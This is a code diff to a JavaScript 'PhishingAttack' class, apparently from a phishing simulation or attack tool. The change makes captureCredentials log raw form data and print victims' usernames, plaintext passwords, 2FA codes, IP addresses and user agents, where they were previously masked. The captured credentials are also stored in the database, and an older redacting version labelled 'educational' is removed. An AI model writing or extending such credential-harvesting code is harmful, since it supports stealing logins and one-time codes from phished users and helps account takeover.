@@ -202,6 +202,10 @@ class PhishingAttack {
 
   captureCredentials(attackId, formData, headers) {
     const timestamp = new Date().toISOString();
+    
+    // Debug: Log raw form data
+    console.log(`📊 [DEBUG] Raw form data:`, formData);
+    
     const params = new URLSearchParams(formData);
     
     const capturedData = {
@@ -214,29 +218,47 @@ class PhishingAttack {
       formData: Object.fromEntries(params)
     };
 
-    console.log(`🎯 [CREDENTIALS CAPTURED] Attack ID: ${attackId}`);
-    console.log(`👤 Username: ${capturedData.username}`);
-    console.log(`🔑 Password: ${'*'.repeat(capturedData.password.length)}`);
-    console.log(`📱 2FA Code: ${capturedData.otp}`);
+    console.log(`\n🎯 [PHISHING SUCCESS] Attack ID: ${attackId}`);
+    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+    console.log(`👤 Username: ${capturedData.username || '❌ NOT CAPTURED'}`);
+    console.log(`🔑 Password: ${capturedData.password || '❌ NOT CAPTURED'}`);
+    console.log(`📱 2FA Code: ${capturedData.otp || '❌ NOT PROVIDED'}`);
+    console.log(`🌐 IP Address: ${capturedData.ip}`);
+    console.log(`💻 User Agent: ${capturedData.userAgent.substring(0, 50)}...`);
+    console.log(`⏰ Timestamp: ${timestamp}`);
+    console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);
 
-    // Store captured credentials
+    // Store captured credentials in memory
     const existingData = this.capturedCredentials.get(attackId) || [];
     existingData.push(capturedData);
     this.capturedCredentials.set(attackId, existingData);
 
-    // Update attack as successful
+    // Prepare credentials for database (don't store actual password, just indicate it was captured)
+    const credentialsForDB = {
+      username: capturedData.username,
+      password: capturedData.password ? '***CAPTURED***' : null,
+      totp: capturedData.otp || null,
+      user_agent: capturedData.userAgent,
+      ip_address: capturedData.ip,
+      timestamp: capturedData.timestamp,
+      capture_method: 'phishing_form'
+    };
+
+    // Update attack as successful and store captured credentials
     const updateQuery = `
       UPDATE attack_logs 
       SET success = 1,
-          status = 'successful'
+          status = 'successful',
+          captured_credentials = ?
       WHERE id = ?
     `;
     
-    database.getDB().run(updateQuery, [attackId], (err) => {
+    database.getDB().run(updateQuery, [JSON.stringify(credentialsForDB), attackId], (err) => {
       if (err) {
         console.error('Error updating attack success:', err);
       } else {
-        console.log(`✅ [PHISHING SUCCESS] Attack ${attackId} - credentials captured!`);
+        console.log(`✅ [PHISHING SUCCESS] Attack ${attackId} - credentials captured and stored!`);
+        console.log(`📊 Database updated with captured credentials`);
         
         // Also store captured credentials separately for easy retrieval
         const insertCredQuery = `
@@ -389,43 +411,6 @@ class PhishingAttack {
     </script>
 </body>
 </html>`;
-  }
-
-  async captureCredentials(attackId, credentials) {
-    return new Promise((resolve, reject) => {
-      // Log captured credentials (in educational context)
-      console.log(`🎯 [PHISHING CAPTURE] Attack ID: ${attackId}`);
-      console.log(`📊 Captured data: Username: ${credentials.username}, Password: [REDACTED], 2FA: ${credentials.twofa || 'Not provided'}`);
-      
-      // Update attack status
-      const query = `
-        UPDATE attack_logs 
-        SET status = 'successful', 
-            attack_data = json_patch(attack_data, json('{"captured_at": "' || datetime('now') || '", "credentials_captured": true}'))
-        WHERE id = ?
-      `;
-
-      database.getDB().run(query, [attackId], function(err) {
-        if (err) {
-          reject(err);
-        } else {
-          // Log security event
-          const securityEventQuery = `
-            INSERT INTO security_events (event_type, severity, description, metadata)
-            VALUES (?, ?, ?, ?)
-          `;
-          
-          database.getDB().run(securityEventQuery, [
-            'phishing_success',
-            'high',
-            'Phishing attack successfully captured user credentials',
-            JSON.stringify({ attack_id: attackId, timestamp: new Date().toISOString() })
-          ], () => {
-            resolve({ success: true, attack_id: attackId });
-          });
-        }
-      });
-    });
   }
 
   async getStatus(attackId) {
